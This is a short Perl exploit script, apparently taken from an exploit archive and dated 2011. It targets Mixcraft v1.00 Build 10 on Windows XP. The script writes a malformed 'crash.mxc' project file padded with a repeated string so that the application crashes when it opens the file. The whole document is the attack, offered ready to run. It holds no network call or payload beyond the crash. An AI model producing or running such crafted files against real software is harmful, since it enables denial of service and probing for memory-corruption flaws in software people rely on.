#!/usr/bin/perl
 
print q(
########################################################
# home : http://www.D99Y.com 
# Date : 9/8/2011 
# Author : NassRawI 
# Software Link : http://www.acoustica.com/mixcraft/
# Version : v1.00 Build 10 
# Tested on : Windows XP SP2
########################################################
);
 
my $file= "crash.mxc";
my $junk= "\x64\x39\x39\x79\x2e\x63\x6f\x6d" x 1000 ;
open(d99y,">$file");
print d99y $junk ;
close(d99y);
print "\n [ # ] Vulnerable File Created !\n"
